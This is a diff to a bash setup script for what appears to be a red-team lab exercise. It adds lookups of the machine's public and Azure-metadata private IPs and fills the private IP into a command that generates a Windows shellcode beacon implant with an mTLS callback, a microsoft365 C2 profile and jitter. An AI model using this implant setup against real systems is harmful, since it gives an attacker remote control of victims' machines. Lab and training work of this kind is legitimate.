@@ -480,10 +480,21 @@ ok "deploy-runcommand.sh created"
 ###############################################################################
 # Done
 ###############################################################################
+PUBLIC_IP="$(curl -s ifconfig.me 2>/dev/null || echo 'unavailable')"
+PRIVATE_IP="$(curl -s -H 'Metadata:true' --noproxy '*' \
+  'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01&format=text' \
+  2>/dev/null || echo 'unavailable')"
+
 echo ""
 echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
 echo -e "${GREEN}  Setup Complete!${NC}"
 echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
+echo ""
+echo -e "  ${CYAN}This Machine:${NC}"
+echo -e "  Public:  ${PUBLIC_IP}"
+echo -e "  Private: ${PRIVATE_IP}"
+echo ""
+echo -e "  ${YELLOW}NOTE: Use the Private IP as your C2 callback address for this exercise.${NC}"
 echo ""
 echo -e "  ${CYAN}Quick Start:${NC}"
 echo ""
@@ -491,7 +502,7 @@ echo -e "  ${YELLOW}1. Start server + listener:${NC}"
 echo -e "     ./start.sh"
 echo ""
 echo -e "  ${YELLOW}2. Generate implant (NO --evasion):${NC}"
-echo -e "     generate beacon --mtls YOUR_IP:8888 --os windows --arch amd64 \\"
+echo -e "     generate beacon --mtls ${PRIVATE_IP}:8888 --os windows --arch amd64 \\"
 echo -e "       --format shellcode --c2profile microsoft365 \\"
 echo -e "       --seconds 60 --jitter 30 --save /tmp/beacon.bin"
 echo ""
